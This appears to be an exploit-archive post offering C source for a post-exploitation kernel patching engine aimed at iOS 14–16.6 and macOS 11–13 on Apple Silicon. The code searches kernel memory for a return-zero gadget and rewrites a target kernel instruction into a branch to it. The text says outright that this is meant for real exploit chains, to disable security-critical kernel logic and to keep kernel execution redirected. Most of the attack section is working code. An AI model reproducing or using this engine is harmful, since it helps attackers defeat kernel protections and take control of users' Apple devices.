=============================================================================================================================================
| # Title     : iOS 14.x–16.6 and macOS 11–13(Apple Silicon) Post‑Exploitation ARM64 XNU Kernel Patch Engine                                |
| # Author    : indoushka                                                                                                                   |
| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
| # Vendor    : https://apps.apple.com/                                                                                                     |
=============================================================================================================================================

[+] References : https://packetstorm.news/files/id/214296/

[+] Summary    : This code implements a deterministic kernel patching engine designed for Apple operating systems running on ARM64 (AArch64) architecture, including iOS, iPadOS, and macOS on Apple Silicon.

The engine operates strictly in a post‑exploitation context, assuming the attacker already possesses:

A reliable kernel read/write primitive

Valid VA → PA translation

The ability to quiesce CPU execution system‑wide

Its primary function is to locate a predefined instruction gadget within a bounded kernel virtual address range and atomically patch a target kernel instruction with an ARM64 B (branch) instruction, redirecting execution flow to the discovered gadget.

The implementation strictly follows ARM ARM Section C3.2.2, correctly handling:

Program Counter semantics (PC = current instruction address + 4)

Signed imm26 branch offset encoding

Mandatory 4‑byte instruction alignment

±128MB architectural branch range limits

Additionally, the engine incorporates multiple defensive correctness guarantees, including:

Integer wraparound and overflow protection

Page‑boundary‑safe kernel memory scanning

Idempotent patch detection (re‑entry safe)

Atomic write → verify → rollback logic

Full instruction and data cache synchronization

System‑wide CPU quiescing to prevent fetch or execution races

This code is not a standalone exploit, but a reusable kernel‑level patching primitive, intended to be embedded within real‑world exploit chains targeting modern Apple XNU kernels protected by PAC, PPL, and KTRR mitigations.

Apple Operating Systems Versions (Applicable Scope)

This component is tightly coupled to Apple ARM64‑based platforms, and its applicability depends on kernel hardening evolution over time.

[+] Supported / Targeted Operating Systems :

iOS / iPadOS

iOS 14.x 

iOS 15.x 

iOS 16.x (up to ~16.6) 

iPadOS versions corresponding to the above

After iOS 16.6, Apple significantly hardened:

Page Protection Layer (PPL)

Kernel Text Read‑Only enforcement (KTRR)

Fine‑grained kernel text permissions

This makes direct branch‑patching non‑trivial and requires additional bypass layers.

macOS (Apple Silicon only)

macOS 11 Big Sur 

macOS 12 Monterey 

macOS 13 Ventura 

macOS 14 Sonoma  (out of scope)

[+] Supported SoCs:

M1

M1 Pro / Max

M2 (partial / configuration‑dependent)

Not Supported / Out of Scope

Intel‑based macOS (x86_64)

watchOS / tvOS

iOS 17+ / macOS 14+ without additional exploits

[+] Reasons:

Hardware‑enforced kernel text protections

Changed cache coherency semantics

Elimination of practical direct B instruction patching

[+] Kernel Context :

Kernel: Apple XNU

Architecture: ARM64 / ARM64e

[+] PAC: Optional / partially mitigated

Kernel Text: Non‑virtualized, pre‑fine‑grained PPL

Exploit Chain Placement (High Level)

This component is typically executed after:

[+] Userland exploit :

Kernel information leak

Stable kernel R/W primitive

PAC bypass (if applicable)

It is commonly used to:

Disable or redirect security‑critical kernel logic

Hook kernel functions deterministically

Establish early or persistent kernel execution redirection

[+] POC :

#include <stdint.h>
#include <stdbool.h>
#include <string.h>

#define ARM64_B_OPCODE      0x14000000
#define PAGE_SIZE           4096
#define PAGE_MASK           (~(PAGE_SIZE - 1))

#define MIN_B_OFFSET_WORDS  -33554432 // -2^25
#define MAX_B_OFFSET_WORDS   33554431 // 2^25 - 1

extern uint64_t kvirt_to_phys(uint64_t va);
extern int kread_phys(uint64_t pa, void *buf, size_t sz);
extern int kwrite_phys_atomic32(uint64_t pa, uint32_t val);
extern void kcache_full_sync(uint64_t va); 
extern int cpu_quiesce_system(void); 
extern void cpu_resume_system(void);

bool patch_kernel_absolute_final(uint64_t patch_va, uint64_t search_base_va, size_t range) {

    if ((patch_va & 0x3) || (search_base_va & 0x3) || range < 8) return false;
    if (search_base_va > (UINT64_MAX - range)) return false; 

    bool success = false;
    bool is_quiesced = false;
    uint32_t old_instr, verify_instr;
    uint64_t gadget_va = 0;

    uint64_t patch_pa = kvirt_to_phys(patch_va);
    if (patch_pa == 0) return false;

    if (cpu_quiesce_system() != 0) return false;
    is_quiesced = true;

    if (kread_phys(patch_pa, &old_instr, 4) != 0) goto end;

    static const uint8_t PATTERN[] = { 0x00, 0x00, 0x80, 0xD2, 0xC0, 0x03, 0x5F, 0xD6 };
    uint8_t window[8];
    
    for (size_t i = 0; i <= (range - 8); i += 4) {
        uint64_t cur_va = search_base_va + i;
        if (cur_va == patch_va) continue;

        if ((cur_va & PAGE_MASK) != ((cur_va + 7) & PAGE_MASK)) continue;

        uint64_t cur_pa = kvirt_to_phys(cur_va);
        if (cur_pa != 0 && kread_phys(cur_pa, window, 8) == 0) {
            if (memcmp(window, PATTERN, 8) == 0) {
                gadget_va = cur_va;
                break;
            }
        }
    }

    if (!gadget_va) goto end;

    int64_t diff = (int64_t)gadget_va - ((int64_t)patch_va + 4);
   
    if (diff % 4 != 0) goto end;
    int64_t imm26 = diff >> 2;

    if (imm26 < MIN_B_OFFSET_WORDS || imm26 > MAX_B_OFFSET_WORDS) goto end;

    uint32_t new_b = ARM64_B_OPCODE | ((uint32_t)imm26 & 0x03FFFFFF);

    if (old_instr == new_b) {
        success = true;
        goto end;
    }

    if (kwrite_phys_atomic32(patch_pa, new_b) == 0) {
        kcache_full_sync(patch_va);
        
        if (kread_phys(patch_pa, &verify_instr, 4) == 0 && verify_instr == new_b) {
            success = true;
        } else {

            (void)kwrite_phys_atomic32(patch_pa, old_instr);
        }
    }

end:
    if (is_quiesced) cpu_resume_system();
    return success;
}

	
Greetings to :============================================================
jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
==========================================================================